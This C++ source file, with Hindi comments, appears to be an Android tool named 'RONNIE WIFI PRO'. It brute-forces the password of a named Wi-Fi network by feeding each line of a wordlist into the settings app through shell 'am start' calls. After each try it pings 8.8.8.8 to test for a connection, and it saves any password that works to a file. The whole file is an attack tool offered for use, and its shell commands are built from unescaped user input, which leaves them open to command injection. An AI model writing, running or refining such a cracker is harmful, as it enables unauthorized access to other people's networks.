#include <iostream>
#include <string>
#include <fstream>
#include <unistd.h>

using namespace std;

#define RESET   "\033[0m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define CYAN    "\033[36m"
#define BOLD    "\033[1m"

// इंटरनेट चेक करने का सबसे सटीक तरीका
bool isConnected() {
    // 3 बार पिंग करके सुनिश्चित करें कि कनेक्शन स्टेबल है
    int res = system("ping -c 2 -W 3 8.8.8.8 > /dev/null 2>&1");
    return (res == 0);
}

int main() {
    system("clear");
    cout << CYAN << BOLD << "===========================================" << endl;
    cout << "      RONNIE WIFI PRO (SUCCESS FIX)        " << endl;
    cout << "===========================================" << RESET << endl;

    string ssid, wordlist;
    int sleepTime;

    cout << CYAN << "Target SSID: " << RESET;
    if (!(cin >> ws)) return 0;
    getline(cin, ssid);

    cout << CYAN << "Wordlist Path: " << RESET;
    getline(cin, wordlist);

    cout << CYAN << "Sleep Time (Recommended: 12-15s): " << RESET;
    cin >> sleepTime;

    ifstream file(wordlist.c_str());
    if (!file.is_open()) {
        cout << RED << "[-] Error: Wordlist nahi mili!" << RESET << endl;
        return 1;
    }

    string pass;
    int line_count = 0;
    bool success = false;

    cout << YELLOW << "\n[*] Attack Started... Mobile Data OFF rakhein!" << RESET << endl;
    cout << "-------------------------------------------" << endl;

    while (getline(file, pass)) {
        line_count++;
        
        if (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n')) pass.pop_back();
        if (pass.length() < 8) continue;

        cout << CYAN << "[" << line_count << "] TRYING: " << pass << flush;

        // 1. वाई-फाई को एक बार 'Disable/Enable' करने का संकेत देना (Non-root trick)
        // यह पुराने गलत पासवर्ड के कैश को साफ करने में मदद करता है
        system("am start -a android.settings.WIFI_SETTINGS > /dev/null 2>&1");
        usleep(500000); // 0.5s gap

        // 2. नया पासवर्ड इंजेक्ट करना
        string cmd = "am start -a android.intent.action.MAIN -n com.android.settings/.wifi.WriteWifiConfig --es ssid \"" + ssid + "\" --es password \"" + pass + "\" > /dev/null 2>&1";
        system(cmd.c_str());

        // 3. इंतज़ार करें ताकि वाई-फाई ऑथेंटिकेशन पूरा हो सके
        for(int i = 0; i < sleepTime; i++) {
            cout << "." << flush;
            sleep(1);
        }

        if (isConnected()) {
            cout << GREEN << BOLD << " >> [SUCCESS!]" << RESET << endl;
            cout << GREEN << BOLD << "\n[+] SAHI PASSWORD MIL GAYA: " << pass << RESET << endl;
            
            ofstream save("found_pass.txt", ios::app);
            save << "SSID: " << ssid << " | PASS: " << pass << endl;
            save.close();
            
            success = true;
            break; // सही पासवर्ड मिलते ही रुक जाएगा
        } else {
            cout << RED << " >> [FAILED]" << RESET << endl;
        }
    }

    if (!success) cout << RED << "\n[-] Wordlist khatam. Sahi password nahi mila." << RESET << endl;

    file.close();
    return 0;
}
